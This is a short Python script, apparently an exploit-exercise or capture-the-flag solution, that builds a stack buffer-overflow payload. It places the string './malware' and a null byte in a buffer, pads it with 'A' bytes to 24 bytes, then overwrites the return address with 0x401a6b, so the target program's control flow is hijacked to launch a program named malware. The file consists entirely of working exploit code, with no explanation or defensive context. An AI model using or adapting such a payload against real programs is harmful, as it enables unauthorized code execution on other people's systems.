import sys
import struct

command = b"./malware\x00"
padding = b"A" * (24 - len(command))
return_address = struct.pack("<Q", 0x401a6b)

payload = command + padding + return_address
sys.stdout.buffer.write(payload)
